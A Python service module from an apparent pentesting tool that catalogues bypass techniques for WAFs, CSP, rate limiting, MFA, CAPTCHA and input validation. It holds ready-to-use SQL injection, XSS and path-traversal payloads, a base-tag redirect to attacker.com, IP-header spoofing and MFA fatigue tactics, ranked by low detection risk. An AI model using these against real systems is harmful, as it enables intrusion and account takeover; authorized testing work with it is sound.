"""
Compensating Control Bypass Techniques Service

Provides pentesters with specific bypass techniques for security controls
that may be protecting vulnerable endpoints. This helps turn "theoretical"
vulnerabilities into exploitable ones.

For each control type, provides:
- Detection methods (how to confirm control is present)
- Bypass techniques (specific methods to circumvent)
- Testing payloads (ready-to-use test cases)
- Tool recommendations (specific tools for bypass)
"""

from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum

from backend.core.logging import get_logger

logger = get_logger(__name__)


class ControlType(str, Enum):
    """Types of compensating controls."""
    WAF = "waf"
    CSP = "csp"
    RATE_LIMITING = "rate_limiting"
    MFA = "mfa"
    CAPTCHA = "captcha"
    INPUT_VALIDATION = "input_validation"
    CORS = "cors"
    CSRF_TOKEN = "csrf_token"
    HSTS = "hsts"
    SANDBOX = "sandbox"
    NETWORK_SEGMENTATION = "network_segmentation"
    IP_WHITELIST = "ip_whitelist"


@dataclass
class BypassTechnique:
    """A specific bypass technique for a control."""
    name: str
    description: str
    complexity: str  # trivial, low, medium, high
    reliability: str  # high, medium, low, theoretical
    steps: List[str]
    example_payloads: List[str] = field(default_factory=list)
    tools: List[str] = field(default_factory=list)
    detection_risk: str = "medium"  # low, medium, high - chance of triggering alerts
    prerequisites: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "complexity": self.complexity,
            "reliability": self.reliability,
            "steps": self.steps,
            "example_payloads": self.example_payloads,
            "tools": self.tools,
            "detection_risk": self.detection_risk,
            "prerequisites": self.prerequisites,
            "references": self.references,
        }


@dataclass
class ControlBypassGuide:
    """Complete bypass guide for a compensating control."""
    control_type: ControlType
    control_name: str
    description: str
    detection_methods: List[str]
    bypass_techniques: List[BypassTechnique]
    general_tips: List[str]
    common_misconfigurations: List[str]
    vulnerability_specific_notes: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "control_type": self.control_type.value,
            "control_name": self.control_name,
            "description": self.description,
            "detection_methods": self.detection_methods,
            "bypass_techniques": [t.to_dict() for t in self.bypass_techniques],
            "general_tips": self.general_tips,
            "common_misconfigurations": self.common_misconfigurations,
            "vulnerability_specific_notes": self.vulnerability_specific_notes,
        }


# =============================================================================
# BYPASS TECHNIQUE LIBRARY
# =============================================================================

WAF_BYPASS_TECHNIQUES = [
    BypassTechnique(
        name="Case Variation",
        description="Alternate upper/lower case to bypass pattern matching",
        complexity="trivial",
        reliability="medium",
        steps=[
            "Identify the blocked keyword (e.g., 'SELECT')",
            "Try variations: SeLeCt, sElEcT, SELECT",
            "Mix with other techniques if single case change fails"
        ],
        example_payloads=[
            "SeLeCt * FrOm users",
            "<ScRiPt>alert(1)</ScRiPt>",
            "UnIoN SeLeCt NULL,NULL--"
        ],
        tools=["Burp Suite Intruder", "sqlmap --tamper=randomcase"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="URL Encoding",
        description="Single, double, or triple URL encode payloads",
        complexity="trivial",
        reliability="medium",
        steps=[
            "URL encode the entire payload once",
            "If blocked, try double encoding (%25 instead of %)",
            "Try encoding only specific characters"
        ],
        example_payloads=[
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "1%27%20OR%20%271%27=%271"
        ],
        tools=["Burp Decoder", "CyberChef", "sqlmap --tamper=charencode"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Unicode/UTF-8 Encoding",
        description="Use Unicode representations of characters",
        complexity="low",
        reliability="medium",
        steps=[
            "Replace ASCII with Unicode equivalents",
            "Try full-width characters (U+FF00 range)",
            "Use overlong UTF-8 encodings"
        ],
        example_payloads=[
            "<script\\u003ealert(1)</script>",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "SELECT\\u0020*\\u0020FROM"
        ],
        tools=["Burp Suite", "CyberChef"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Comment Injection",
        description="Break up keywords using SQL/HTML comments",
        complexity="low",
        reliability="high",
        steps=[
            "Insert comments within blocked keywords",
            "For SQL: use /**/, --, #",
            "For HTML/JS: use <!-- -->, /* */"
        ],
        example_payloads=[
            "SEL/**/ECT * FR/**/OM users",
            "UN/**/ION/**/SEL/**/ECT",
            "<scr<!--comment-->ipt>alert(1)</script>",
            "1'/**/OR/**/1=1--"
        ],
        tools=["sqlmap --tamper=space2comment", "Manual testing"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="HTTP Parameter Pollution",
        description="Send duplicate parameters to confuse WAF vs app parsing",
        complexity="medium",
        reliability="medium",
        steps=[
            "Identify parameter handling differences",
            "Send: ?id=1&id=2 UNION SELECT",
            "WAF may check first, app may use last (or concatenate)"
        ],
        example_payloads=[
            "id=1&id=' UNION SELECT 1,2,3--",
            "search=safe&search=<script>alert(1)</script>",
            "param=val1&param=val2"
        ],
        tools=["Burp Suite", "ParamMiner"],
        detection_risk="medium",
    ),
    BypassTechnique(
        name="Chunked Transfer Encoding",
        description="Split payload across HTTP chunks to evade inspection",
        complexity="medium",
        reliability="medium",
        steps=[
            "Enable chunked transfer in request",
            "Split malicious payload across multiple chunks",
            "WAF may only inspect individual chunks"
        ],
        example_payloads=[
            "Transfer-Encoding: chunked\\r\\n\\r\\n5\\r\\n<scri\\r\\n6\\r\\npt>al\\r\\n...",
        ],
        tools=["Burp Extension: Chunked Coding Converter", "Custom scripts"],
        detection_risk="medium",
        prerequisites=["Target must support chunked encoding"],
    ),
    BypassTechnique(
        name="Content-Type Manipulation",
        description="Change Content-Type to bypass body inspection",
        complexity="low",
        reliability="medium",
        steps=[
            "Try: application/x-www-form-urlencoded with JSON body",
            "Try: multipart/form-data with regular params",
            "Try: text/plain or application/octet-stream"
        ],
        example_payloads=[
            "Content-Type: application/json with urlencoded body",
            "Content-Type: text/plain\\r\\n\\r\\n<script>alert(1)</script>"
        ],
        tools=["Burp Suite", "curl"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Null Byte Injection",
        description="Use null bytes to truncate WAF pattern matching",
        complexity="low",
        reliability="low",
        steps=[
            "Insert %00 before or within payload",
            "Some WAFs stop parsing at null byte",
            "Application may strip null and process rest"
        ],
        example_payloads=[
            "%00<script>alert(1)</script>",
            "file.php%00.jpg",
            "SELECT%00* FROM users"
        ],
        tools=["Burp Suite", "Manual testing"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Alternate HTTP Methods",
        description="Try different HTTP methods that may bypass WAF rules",
        complexity="trivial",
        reliability="low",
        steps=[
            "If GET is blocked, try POST with same payload",
            "Try PUT, PATCH, or custom methods",
            "Some WAFs only inspect certain methods"
        ],
        example_payloads=[
            "PUT /api/user HTTP/1.1 with injection in body",
            "X-HTTP-Method-Override: POST"
        ],
        tools=["Burp Suite", "curl -X METHOD"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="IP Rotation / Origin Spoofing",
        description="Bypass IP-based rate limiting or blocking",
        complexity="medium",
        reliability="high",
        steps=[
            "Try X-Forwarded-For, X-Real-IP headers",
            "Use proxy chains or cloud functions",
            "Rotate through IP pool"
        ],
        example_payloads=[
            "X-Forwarded-For: 127.0.0.1",
            "X-Real-IP: 10.0.0.1",
            "X-Originating-IP: 192.168.1.1"
        ],
        tools=["Burp Collaborator", "AWS Lambda", "Tor"],
        detection_risk="medium",
    ),
]

CSP_BYPASS_TECHNIQUES = [
    BypassTechnique(
        name="JSONP Endpoints",
        description="Abuse JSONP callbacks from allowed domains",
        complexity="medium",
        reliability="high",
        steps=[
            "Identify allowed domains in CSP script-src",
            "Find JSONP endpoints on those domains",
            "Inject script tag pointing to JSONP with XSS callback"
        ],
        example_payloads=[
            "<script src='//allowed.com/api?callback=alert(1)//'></script>",
            "<script src='//cdn.example.com/jsonp?cb=eval(atob(`YWxlcnQoMSk=`))//'></script>"
        ],
        tools=["CSP Evaluator", "cspscanner"],
        detection_risk="low",
        prerequisites=["CSP allows external scripts from exploitable domain"],
    ),
    BypassTechnique(
        name="Angular/Vue/React Template Injection",
        description="Use framework-specific template injection on allowed pages",
        complexity="medium",
        reliability="high",
        steps=[
            "Identify if page uses Angular/Vue with allowed scripts",
            "Inject template expressions: {{constructor.constructor('alert(1)')()}}",
            "For Vue: check for v-html or :inner-html"
        ],
        example_payloads=[
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>"
        ],
        tools=["Manual testing", "Burp Suite"],
        detection_risk="low",
        prerequisites=["Target uses Angular/Vue/React"],
    ),
    BypassTechnique(
        name="Base URI Manipulation",
        description="Abuse missing base-uri directive",
        complexity="low",
        reliability="medium",
        steps=[
            "Check if base-uri is missing from CSP",
            "Inject <base href='https://attacker.com'>",
            "Relative script paths will load from attacker domain"
        ],
        example_payloads=[
            "<base href='https://attacker.com/'>",
        ],
        tools=["CSP Evaluator"],
        detection_risk="low",
        prerequisites=["CSP missing base-uri directive"],
    ),
    BypassTechnique(
        name="Unsafe-inline with Nonce Leak",
        description="Find and reuse CSP nonce values",
        complexity="high",
        reliability="medium",
        steps=[
            "Look for nonce values in page source or cache",
            "Check if nonce is predictable or reused",
            "Inject script with stolen/predicted nonce"
        ],
        example_payloads=[
            "<script nonce='leaked-nonce-value'>alert(1)</script>",
        ],
        tools=["Burp Suite", "Browser DevTools"],
        detection_risk="low",
        prerequisites=["CSP uses nonces that are predictable/leaked"],
    ),
    BypassTechnique(
        name="Data URI in Allowed Sources",
        description="Use data: URIs if allowed in CSP",
        complexity="trivial",
        reliability="high",
        steps=[
            "Check if CSP allows data: in script-src or default-src",
            "Inject: <script src='data:text/javascript,alert(1)'></script>"
        ],
        example_payloads=[
            "<script src='data:text/javascript,alert(document.domain)'></script>",
            "<script src='data:;base64,YWxlcnQoMSk='></script>"
        ],
        tools=["CSP Evaluator"],
        detection_risk="low",
        prerequisites=["CSP allows data: URI"],
    ),
    BypassTechnique(
        name="Object/Embed Tag Abuse",
        description="Use object/embed tags if not restricted",
        complexity="medium",
        reliability="medium",
        steps=[
            "Check if object-src is missing or permissive",
            "Inject: <object data='javascript:alert(1)'>",
            "Try <embed> as alternative"
        ],
        example_payloads=[
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)' type='text/html'>"
        ],
        tools=["CSP Evaluator"],
        detection_risk="low",
    ),
]

RATE_LIMITING_BYPASS_TECHNIQUES = [
    BypassTechnique(
        name="Header-Based IP Spoofing",
        description="Spoof origin IP via headers to reset rate limit",
        complexity="trivial",
        reliability="high",
        steps=[
            "Add X-Forwarded-For with random/rotating IPs",
            "Try X-Real-IP, X-Originating-IP, True-Client-IP",
            "Rotate through IP pool in each request"
        ],
        example_payloads=[
            "X-Forwarded-For: 1.2.3.4",
            "X-Real-IP: 5.6.7.8",
            "X-Originating-IP: 9.10.11.12",
            "X-Client-IP: 13.14.15.16",
            "True-Client-IP: 17.18.19.20"
        ],
        tools=["Burp Intruder", "Custom scripts"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Parameter Variation",
        description="Slightly modify requests to appear as different endpoints",
        complexity="low",
        reliability="medium",
        steps=[
            "Add unused parameters: ?_=timestamp or ?x=random",
            "Change parameter order",
            "URL encode some parameters differently"
        ],
        example_payloads=[
            "/login?_=1234567890",
            "/login?nocache=random123",
            "/login?user=admin vs /login?User=admin"
        ],
        tools=["Burp Intruder", "Custom scripts"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Distributed Requests",
        description="Spread requests across multiple IPs/sessions",
        complexity="medium",
        reliability="high",
        steps=[
            "Use multiple proxy servers",
            "Leverage cloud functions (each has different IP)",
            "Use residential proxy networks"
        ],
        example_payloads=[],
        tools=["Cloud Functions", "Proxy pools", "Fireprox"],
        detection_risk="low",
        prerequisites=["Access to proxy infrastructure"],
    ),
    BypassTechnique(
        name="Session Rotation",
        description="Create new sessions to reset per-session limits",
        complexity="low",
        reliability="medium",
        steps=[
            "Clear cookies between requests",
            "Generate new session for each batch",
            "Some rate limits are per-session not per-IP"
        ],
        example_payloads=[],
        tools=["Burp Session Handling", "Custom scripts"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Endpoint Variation",
        description="Find alternate endpoints not covered by rate limiting",
        complexity="medium",
        reliability="medium",
        steps=[
            "Try /api/v1/login vs /api/v2/login",
            "Try /Login, /LOGIN, /login/",
            "Check for mobile API endpoints",
            "Look for GraphQL or alternate auth paths"
        ],
        example_payloads=[
            "/api/mobile/auth",
            "/v2/authenticate",
            "/auth/legacy"
        ],
        tools=["Burp Suite", "ffuf"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Slow Request Attack",
        description="Stay under rate limit by timing requests precisely",
        complexity="low",
        reliability="high",
        steps=[
            "Determine rate limit window (e.g., 100 req/min)",
            "Send requests just under threshold",
            "Use delays between batches"
        ],
        example_payloads=[],
        tools=["Custom scripts", "Burp Intruder with throttling"],
        detection_risk="low",
    ),
]

MFA_BYPASS_TECHNIQUES = [
    BypassTechnique(
        name="Response Manipulation",
        description="Modify server response to bypass MFA check",
        complexity="low",
        reliability="medium",
        steps=[
            "Intercept MFA verification response",
            "Change 'success: false' to 'success: true'",
            "Check if client-side validation only"
        ],
        example_payloads=[
            '{"mfa_verified": true}',
            '{"status": "success"}',
        ],
        tools=["Burp Suite", "mitmproxy"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Direct Resource Access",
        description="Access protected resources without completing MFA",
        complexity="low",
        reliability="medium",
        steps=[
            "Complete password auth, stop before MFA",
            "Try accessing protected pages directly",
            "Check if session is valid without MFA completion"
        ],
        example_payloads=[
            "Navigate directly to /dashboard after password auth",
            "Access API endpoints with partial auth token"
        ],
        tools=["Burp Suite", "Browser"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Backup Code Brute Force",
        description="Brute force backup/recovery codes",
        complexity="medium",
        reliability="medium",
        steps=[
            "Check if backup codes are numeric-only",
            "Check for rate limiting on backup code entry",
            "Brute force if codes are short/predictable"
        ],
        example_payloads=[
            "Try common patterns: 00000000, 12345678",
            "Generate numeric wordlist for code length"
        ],
        tools=["Burp Intruder", "Custom scripts"],
        detection_risk="high",
        prerequisites=["No rate limiting on backup code attempts"],
    ),
    BypassTechnique(
        name="MFA Fatigue Attack",
        description="Spam push notifications until user approves",
        complexity="low",
        reliability="medium",
        steps=[
            "Trigger MFA push repeatedly",
            "User may approve to stop notifications",
            "Best at night or during meetings"
        ],
        example_payloads=[],
        tools=["Custom automation", "Burp Intruder"],
        detection_risk="high",
        prerequisites=["Push-based MFA", "Valid credentials"],
    ),
    BypassTechnique(
        name="Session Token Reuse",
        description="Reuse valid session from before MFA was enabled",
        complexity="medium",
        reliability="low",
        steps=[
            "Check for old session tokens that predate MFA",
            "Look for API tokens without MFA requirement",
            "Check mobile apps for stored credentials"
        ],
        example_payloads=[],
        tools=["Burp Suite", "Token analysis"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="OAuth/SSO Bypass",
        description="Use SSO flow that may not enforce MFA",
        complexity="medium",
        reliability="medium",
        steps=[
            "Check if OAuth login bypasses MFA",
            "Try SAML assertion without MFA claims",
            "Look for social login without MFA"
        ],
        example_payloads=[],
        tools=["Burp Suite", "SAML Raider"],
        detection_risk="low",
    ),
]

CAPTCHA_BYPASS_TECHNIQUES = [
    BypassTechnique(
        name="CAPTCHA Response Replay",
        description="Reuse valid CAPTCHA token multiple times",
        complexity="trivial",
        reliability="medium",
        steps=[
            "Solve CAPTCHA once, capture token",
            "Replay same token in subsequent requests",
            "Some implementations don't invalidate after use"
        ],
        example_payloads=[],
        tools=["Burp Suite"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Remove CAPTCHA Parameter",
        description="Submit form without CAPTCHA field",
        complexity="trivial",
        reliability="low",
        steps=[
            "Remove captcha/g-recaptcha-response parameter",
            "Check if server validates CAPTCHA presence",
            "Try empty value for CAPTCHA field"
        ],
        example_payloads=[
            "g-recaptcha-response=",
            "Remove captcha parameter entirely"
        ],
        tools=["Burp Suite"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="OCR-Based Solving",
        description="Use OCR to automatically solve image CAPTCHAs",
        complexity="medium",
        reliability="medium",
        steps=[
            "Extract CAPTCHA image",
            "Process with OCR (Tesseract)",
            "Submit extracted text"
        ],
        example_payloads=[],
        tools=["Tesseract OCR", "Python PIL", "2Captcha API"],
        detection_risk="low",
        prerequisites=["Simple image-based CAPTCHA"],
    ),
    BypassTechnique(
        name="Audio CAPTCHA Weakness",
        description="Exploit audio CAPTCHA with speech recognition",
        complexity="medium",
        reliability="medium",
        steps=[
            "Request audio CAPTCHA version",
            "Download audio file",
            "Use speech-to-text API to solve"
        ],
        example_payloads=[],
        tools=["Google Speech API", "Whisper", "Custom scripts"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Session-Based CAPTCHA Bypass",
        description="Solve CAPTCHA in one session, use token in another",
        complexity="low",
        reliability="medium",
        steps=[
            "Solve CAPTCHA manually in browser",
            "Copy session cookie to automated tool",
            "CAPTCHA may be session-validated not request-validated"
        ],
        example_payloads=[],
        tools=["Burp Suite", "Browser DevTools"],
        detection_risk="low",
    ),
]

INPUT_VALIDATION_BYPASS_TECHNIQUES = [
    BypassTechnique(
        name="Encoding Variations",
        description="Use various encodings to bypass validation",
        complexity="low",
        reliability="high",
        steps=[
            "Try URL encoding, double encoding",
            "Use HTML entities: &#60;script&#62;",
            "Try Unicode normalization attacks"
        ],
        example_payloads=[
            "%3Cscript%3E",
            "&#x3C;script&#x3E;",
            "<scr\\x00ipt>",
            "\\u003cscript\\u003e"
        ],
        tools=["Burp Suite", "CyberChef"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Null Byte Truncation",
        description="Use null bytes to bypass extension/content checks",
        complexity="low",
        reliability="medium",
        steps=[
            "Append %00 before disallowed content",
            "Insert null in middle of payload",
            "Works against some string functions"
        ],
        example_payloads=[
            "shell.php%00.jpg",
            "file.txt%00<script>",
        ],
        tools=["Burp Suite"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Case Sensitivity Abuse",
        description="Exploit case-insensitive matching gaps",
        complexity="trivial",
        reliability="medium",
        steps=[
            "If 'script' is blocked, try 'SCRIPT', 'Script'",
            "Mix cases: 'ScRiPt'",
            "Check if validation and execution handle case differently"
        ],
        example_payloads=[
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</ScRiPt>"
        ],
        tools=["Manual testing", "Burp Intruder"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Alternative Syntax",
        description="Use alternative syntax not covered by validation",
        complexity="medium",
        reliability="high",
        steps=[
            "For XSS: try event handlers, SVG, math tags",
            "For SQLi: try alternate functions, operators",
            "For path traversal: try ..\\, ..%2f, ..%c0%af"
        ],
        example_payloads=[
            "<svg onload=alert(1)>",
            "<math><maction actiontype='statusline#'>XSS</maction></math>",
            "..%252f..%252f",
            "....//....//etc/passwd"
        ],
        tools=["PayloadsAllTheThings", "Burp Suite"],
        detection_risk="low",
    ),
    BypassTechnique(
        name="Whitespace Manipulation",
        description="Use unexpected whitespace characters",
        complexity="low",
        reliability="medium",
        steps=[
            "Use tabs, newlines, form feeds instead of spaces",
            "Insert zero-width characters",
            "Try different line endings"
        ],
        example_payloads=[
            "<script\\t>alert(1)</script>",
            "<script\\n>alert(1)</script>",
            "SELECT\\t*\\tFROM"
        ],
        tools=["Burp Suite", "CyberChef"],
        detection_risk="low",
    ),
]


# =============================================================================
# CONTROL BYPASS GUIDES
# =============================================================================

BYPASS_GUIDES: Dict[ControlType, ControlBypassGuide] = {
    ControlType.WAF: ControlBypassGuide(
        control_type=ControlType.WAF,
        control_name="Web Application Firewall",
        description="WAFs inspect HTTP traffic and block requests matching attack signatures",
        detection_methods=[
            "Look for WAF headers: X-Sucuri-ID, X-CDN, cf-ray (Cloudflare)",
            "Trigger known attack and check for custom error page",
            "Use wafw00f tool: wafw00f https://target.com",
            "Check DNS for CDN/WAF providers (Akamai, Cloudflare, Imperva)",
            "Analyze response timing differences for blocked vs allowed requests"
        ],
        bypass_techniques=WAF_BYPASS_TECHNIQUES,
        general_tips=[
            "Start with encoding techniques - they're often enough",
            "Combine multiple techniques for better success",
            "Test in stages: find what's blocked, then bypass",
            "Check if WAF is in detection-only mode (logs but doesn't block)",
            "Look for origin IP to bypass CDN-based WAFs"
        ],
        common_misconfigurations=[
            "WAF only on main domain, not subdomains",
            "WAF only on GET requests, not POST",
            "WAF not covering API endpoints",
            "Permissive rules for authenticated users",
            "Origin IP exposed via DNS history or SSL cert"
        ],
        vulnerability_specific_notes={
            "sqli": "Use /**/comments, case variation, and inline comments first",
            "xss": "Try event handlers (onerror, onload) instead of script tags",
            "rce": "Use encoding and alternate command syntax (${IFS} for spaces)",
            "path_traversal": "Try ..\\, double encoding, and URL variations",
        }
    ),

    ControlType.CSP: ControlBypassGuide(
        control_type=ControlType.CSP,
        control_name="Content Security Policy",
        description="CSP restricts resource loading and inline script execution",
        detection_methods=[
            "Check Content-Security-Policy header in response",
            "Look for Content-Security-Policy-Report-Only (not enforced)",
            "Use browser DevTools Console for CSP violations",
            "Paste CSP into https://csp-evaluator.withgoogle.com/"
        ],
        bypass_techniques=CSP_BYPASS_TECHNIQUES,
        general_tips=[
            "Always analyze CSP with CSP Evaluator first",
            "Look for 'unsafe-inline' or 'unsafe-eval' - easy bypass",
            "Check all allowed domains for exploitable endpoints",
            "Report-Only mode means CSP isn't blocking anything",
            "Some browsers have CSP implementation bugs"
        ],
        common_misconfigurations=[
            "'unsafe-inline' in script-src (allows inline scripts)",
            "Wildcard sources: *.example.com",
            "Missing base-uri directive",
            "CDN domains allowing user uploads",
            "JSONP endpoints on allowed domains"
        ],
        vulnerability_specific_notes={
            "xss": "CSP is the main defense - finding bypass is critical",
            "clickjacking": "Check frame-ancestors directive",
        }
    ),

    ControlType.RATE_LIMITING: ControlBypassGuide(
        control_type=ControlType.RATE_LIMITING,
        control_name="Rate Limiting",
        description="Limits request frequency to prevent brute force and DoS",
        detection_methods=[
            "Send rapid requests and watch for 429 Too Many Requests",
            "Check response headers: X-RateLimit-Limit, X-RateLimit-Remaining",
            "Look for Retry-After header indicating rate limit",
            "Test from multiple IPs to determine limit scope"
        ],
        bypass_techniques=RATE_LIMITING_BYPASS_TECHNIQUES,
        general_tips=[
            "Determine if limit is per-IP, per-session, or per-user",
            "Check if different endpoints have different limits",
            "Rate limits often reset at specific intervals",
            "API endpoints may have different limits than web pages"
        ],
        common_misconfigurations=[
            "Rate limit trusts X-Forwarded-For header",
            "Different limits for different HTTP methods",
            "Rate limit only on authentication endpoint",
            "No rate limit on password reset or OTP verification"
        ],
        vulnerability_specific_notes={
            "auth_bypass": "Critical to bypass for credential brute force",
            "idor": "May need high volume to enumerate objects",
        }
    ),

    ControlType.MFA: ControlBypassGuide(
        control_type=ControlType.MFA,
        control_name="Multi-Factor Authentication",
        description="Requires additional authentication factor beyond password",
        detection_methods=[
            "Check login flow for MFA prompt after password",
            "Look for MFA setup in account settings",
            "Try accessing protected resources after partial auth"
        ],
        bypass_techniques=MFA_BYPASS_TECHNIQUES,
        general_tips=[
            "Always check for direct resource access after password auth",
            "Look for API endpoints without MFA enforcement",
            "Check if mobile apps have separate auth without MFA",
            "MFA fatigue works surprisingly often"
        ],
        common_misconfigurations=[
            "MFA only enforced on web, not API",
            "Backup codes too short or predictable",
            "MFA can be disabled without re-authentication",
            "Remember device feature is too permissive"
        ],
        vulnerability_specific_notes={
            "auth_bypass": "MFA bypass is often the final hurdle",
        }
    ),

    ControlType.CAPTCHA: ControlBypassGuide(
        control_type=ControlType.CAPTCHA,
        control_name="CAPTCHA",
        description="Challenge-response test to distinguish humans from bots",
        detection_methods=[
            "Look for CAPTCHA on forms (login, registration, contact)",
            "Check for reCAPTCHA, hCaptcha, or custom implementations",
            "Inspect form for captcha-related hidden fields"
        ],
        bypass_techniques=CAPTCHA_BYPASS_TECHNIQUES,
        general_tips=[
            "Always try removing CAPTCHA parameter first",
            "Token reuse is a common implementation flaw",
            "Audio CAPTCHAs are often easier to solve automatically",
            "CAPTCHA solving services exist if needed"
        ],
        common_misconfigurations=[
            "CAPTCHA token not invalidated after use",
            "CAPTCHA only validated client-side",
            "No CAPTCHA on API endpoints",
            "Easy/solved CAPTCHA accepted"
        ],
        vulnerability_specific_notes={
            "auth_bypass": "CAPTCHA prevents brute force - bypass enables attacks",
        }
    ),

    ControlType.INPUT_VALIDATION: ControlBypassGuide(
        control_type=ControlType.INPUT_VALIDATION,
        control_name="Input Validation",
        description="Server-side validation and sanitization of user input",
        detection_methods=[
            "Send special characters and observe filtering",
            "Compare input vs output to identify transformations",
            "Test boundary conditions (length, type)"
        ],
        bypass_techniques=INPUT_VALIDATION_BYPASS_TECHNIQUES,
        general_tips=[
            "Check if validation is client-side only (easily bypassed)",
            "Look for inconsistencies between validation and usage",
            "Double encoding often bypasses single-decode validators",
            "Try every input field, including hidden ones"
        ],
        common_misconfigurations=[
            "Blacklist-based validation (misses alternatives)",
            "Client-side validation only",
            "Validation on some fields but not others",
            "Validation bypass via encoding"
        ],
        vulnerability_specific_notes={
            "sqli": "Focus on quote escaping bypass",
            "xss": "Focus on angle bracket and event handler filtering",
            "path_traversal": "Focus on ../ encoding variations",
            "rce": "Focus on command separator bypass",
        }
    ),
}


# =============================================================================
# SERVICE CLASS
# =============================================================================

class ControlBypassService:
    """
    Service for generating control bypass recommendations.
    """

    def __init__(self):
        self.bypass_guides = BYPASS_GUIDES

    def get_bypass_guide(
        self,
        control_type: ControlType,
        vulnerability_type: Optional[str] = None,
    ) -> ControlBypassGuide:
        """
        Get bypass guide for a specific control type.
        Optionally filter/prioritize techniques for a specific vulnerability.
        """
        guide = self.bypass_guides.get(control_type)
        if not guide:
            return self._create_generic_guide(control_type)
        return guide

    def get_bypass_recommendations(
        self,
        detected_controls: List[Dict[str, Any]],
        vulnerability_type: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Get bypass recommendations for a list of detected controls.

        Args:
            detected_controls: List of {control_type, name, effectiveness, verified}
            vulnerability_type: Optional vuln type to prioritize relevant techniques

        Returns:
            List of bypass guides with prioritized techniques
        """
        recommendations = []

        for control in detected_controls:
            control_type_str = control.get("control_type", control.get("name", "")).lower()

            # Map to ControlType enum
            control_type = self._map_to_control_type(control_type_str)
            if not control_type:
                continue

            guide = self.get_bypass_guide(control_type, vulnerability_type)
            guide_dict = guide.to_dict()

            # Add vulnerability-specific notes if applicable
            if vulnerability_type and vulnerability_type in guide.vulnerability_specific_notes:
                guide_dict["prioritized_note"] = guide.vulnerability_specific_notes[vulnerability_type]

            # Prioritize techniques by reliability for this vuln type
            if vulnerability_type:
                guide_dict["bypass_techniques"] = self._prioritize_techniques(
                    guide.bypass_techniques,
                    vulnerability_type
                )

            recommendations.append(guide_dict)

        return recommendations

    def get_quick_bypass_tips(
        self,
        control_type: ControlType,
    ) -> List[str]:
        """
        Get quick actionable tips for bypassing a control.
        """
        guide = self.bypass_guides.get(control_type)
        if not guide:
            return ["No specific bypass techniques available for this control type"]

        tips = []
        # Get top 3 most reliable techniques
        reliable = sorted(
            guide.bypass_techniques,
            key=lambda t: (t.reliability == "high", t.complexity == "trivial"),
            reverse=True
        )[:3]

        for tech in reliable:
            tips.append(f"**{tech.name}**: {tech.steps[0] if tech.steps else tech.description}")

        return tips

    def _map_to_control_type(self, control_str: str) -> Optional[ControlType]:
        """Map string to ControlType enum."""
        mappings = {
            "waf": ControlType.WAF,
            "web application firewall": ControlType.WAF,
            "csp": ControlType.CSP,
            "content security policy": ControlType.CSP,
            "rate limit": ControlType.RATE_LIMITING,
            "rate limiting": ControlType.RATE_LIMITING,
            "mfa": ControlType.MFA,
            "multi-factor": ControlType.MFA,
            "two-factor": ControlType.MFA,
            "2fa": ControlType.MFA,
            "captcha": ControlType.CAPTCHA,
            "recaptcha": ControlType.CAPTCHA,
            "input validation": ControlType.INPUT_VALIDATION,
            "sanitization": ControlType.INPUT_VALIDATION,
        }

        control_lower = control_str.lower()
        for key, value in mappings.items():
            if key in control_lower:
                return value
        return None

    def _prioritize_techniques(
        self,
        techniques: List[BypassTechnique],
        vulnerability_type: str,
    ) -> List[Dict[str, Any]]:
        """Prioritize techniques based on vulnerability type."""
        # Score each technique
        scored = []
        for tech in techniques:
            score = 0

            # Reliability scoring
            if tech.reliability == "high":
                score += 3
            elif tech.reliability == "medium":
                score += 2
            elif tech.reliability == "low":
                score += 1

            # Complexity scoring (lower is better)
            if tech.complexity == "trivial":
                score += 3
            elif tech.complexity == "low":
                score += 2
            elif tech.complexity == "medium":
                score += 1

            # Detection risk scoring (lower is better)
            if tech.detection_risk == "low":
                score += 2
            elif tech.detection_risk == "medium":
                score += 1

            scored.append((score, tech))

        # Sort by score descending
        scored.sort(key=lambda x: x[0], reverse=True)

        return [t.to_dict() for _, t in scored]

    def _create_generic_guide(self, control_type: ControlType) -> ControlBypassGuide:
        """Create a generic guide for unknown control types."""
        return ControlBypassGuide(
            control_type=control_type,
            control_name=control_type.value.replace("_", " ").title(),
            description=f"Generic bypass guide for {control_type.value}",
            detection_methods=["Analyze response headers and behavior"],
            bypass_techniques=[],
            general_tips=[
                "Study the specific implementation",
                "Look for configuration weaknesses",
                "Test edge cases and boundary conditions"
            ],
            common_misconfigurations=[
                "Inconsistent enforcement across endpoints",
                "Missing coverage on API endpoints"
            ]
        )


# Singleton instance
control_bypass_service = ControlBypassService()
